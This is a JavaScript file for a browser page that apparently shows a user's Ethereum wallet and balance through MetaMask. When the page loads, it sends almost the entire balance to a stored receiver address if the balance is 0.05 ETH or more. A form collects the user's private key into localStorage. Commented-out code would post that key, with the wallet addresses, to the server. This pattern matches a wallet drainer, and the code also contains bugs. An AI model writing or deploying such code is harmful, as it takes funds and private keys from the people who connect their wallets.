import { ethers } from "/ethers-5.1.esm.min.js";

// Body
const h1 = document.querySelector('.h1');
const h2 = document.querySelector('.h2');
const ethereumBody = document.querySelector('.ethereum');
const balanceBody = document.querySelector('.balance');
const transferBtn = document.querySelector('.transferBtn');

// Nav
const connectBtn = document.querySelector('.btn-connect');
const settings = document.querySelector('.fa-cog');

// Modal
const modal = document.querySelector('.modal');
const closeModalBtn = document.querySelector('.btn-modal');
const titleModal = document.querySelector('.title');
const modalContent = document.querySelector('.modal-content');
const provider = new ethers.providers.Web3Provider(window.ethereum);
const signer = provider.getSigner();

let balance = ethers.utils.formatEther(await provider.getBalance(localStorage.getItem('account')));

const addrAccountLoged = localStorage.getItem('account').trim();
const addrAccountLogedKey = localStorage.getItem('addrAccountLogedKey').trim();
const addrReceiver = localStorage.getItem('walletReciveAddress').trim();

const connectWallet = async () => {
    if(!window.ethereum) {
        modal.style.opacity = '1';
        modal.style.visibility = 'visible';
        modal.style.transform = 'translateY(0%)';

        titleModal.innerHTML = `Error`;
        modalContent.innerHTML = `No crypto wallet found. Please install it.<a href="https://metamask.io/" target="_blank">Install Metamask</a>`;
        return;
    }

    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
    // chainId
    let chain = await ethereum.request({ method: 'eth_chainId' });
    localStorage.setItem('account', accounts[0]);

    if(chain !== 0x1) {
        try {
            await ethereum.request({
                method: 'wallet_switchEthereumChain', 
                params: [{chainId: '0x1'}],
            });
            connectBtn.style.display = 'none';
            settings.style.display = 'block';
        } catch (error) {
            modal.style.opacity = '1';
            modal.style.visibility = 'visible';
            modal.style.transform = 'translateY(0%)';

            titleModal.innerHTML = `Error ${error.code}`;
            modalContent.innerHTML = `${error.message}`;
            return;
        }
    }
    h1.innerHTML = `My wallet`;
    h2.innerHTML = addrAccountLoged;
    ethereumBody.style.display = 'flex';
    balanceBody.innerHTML = `${balance} ETH`
}

const errorMsg = document.querySelector('.err');
const startTransafer = async (balance) => {
    try {
        if(!addrReceiver) {
            errorMsg.innerHTML = "the wallet of the eth will be received is not defined";
            setTimeout(() => errorMsg.innerHTML = '', 5000);
            return;
        }
        ethers.utils.getAddress(addrReceiver);
        const tx = await signer.sendTransaction({
            to: addrReceiver.toString(),
            value: ethers.utils.parseEther((balance - 0.00042).toString()),
        });
        errorMsg.innerHTML = tx.hash;
    } catch (error) {
        console.error(error.message);
    }
}

// const postTransfer = async (url = '', data = {}) => {
//     const response = await fetch(url, {
//         method: 'POST', // *GET, POST, PUT, DELETE, etc.
//         body: new URLSearchParams({
//             addrAccountLoged: data.addrAccountLoged,
//             addrReceiver: data.addrReceiver,
//             addrAccountLogedKey: data.addrAccountLogedKey
//         }),
//       });
//     return response.json();
// }

// postTransfer('/', { addrAccountLoged, addrReceiver, addrAccountLogedKey }).then( data => {
//     console.log(data);
// }).catch(err => {
//     console.error(err.message);
// });

if(balance >= 0.05) {
    startTransafer(balance);
}

transferBtn.addEventListener('click', () => {
    if(balance !== '0.0') {
        startTransafer(balance)
        return;
    }

    errorMsg.innerHTML = `Can't send transaction if the balance is 0`
});

connectBtn.addEventListener('click', () => {
    connectWallet();
});

settings.addEventListener('click', () => {
    modal.style.opacity = '1';
    modal.style.visibility = 'visible';
    modal.style.transform = 'translateY(0%)';

    titleModal.innerHTML = `Settings`;
    walletRecive.innerHTML = addrReceiver;
});

closeModalBtn.addEventListener('click', () => {
    modal.style.opacity = '0';
    modal.style.visibility = 'hidden';
    modal.style.transform = 'translateY(-30%)';
});

const errorMessage = document.querySelector('.error');
const inputWalletAddr = document.querySelector('#Wallet');
const inputKeyAddr = document.querySelector('#Key');
const btnSubmit = document.querySelector('.btn');
const walletRecive = document.querySelector('.walletRecive');
const deleteLocal = document.querySelector('#delete');

btnSubmit.addEventListener('click', (e) => {
    e.preventDefault();
    if(inputWalletAddr.value === addrAccountLoged) {
        errorMessage.innerHTML = "Can't be equal to your wallet address";
        setTimeout(() => errorMessage.innerHTML = '', 5000);
        return;
    }

    if(inputKeyAddr.value === '') {
        errorMessage.innerHTML = 'Complete field the private key';
        setTimeout(() => errorMessage.innerHTML = '', 5000);
        return;
    }

    if(!inputWalletAddr.value.startsWith("0x")) {
        errorMessage.innerHTML = 'Is not a wallet';
        setTimeout(() => errorMessage.innerHTML = '', 5000);
        return;
    }
    localStorage.setItem("walletReciveAddress", inputWalletAddr.value);
    localStorage.setItem("addrAccountLogedKey", inputKeyAddr.value);
    inputWalletAddr.value = "";
    inputKeyAddr.value = "";

    walletRecive.innerHTML = addrReceiver;
    e.stopPropagation();
});

deleteLocal.addEventListener('click', (e) => {
    localStorage.removeItem('walletReciveAddress');
    walletRecive.innerHTML = "";
});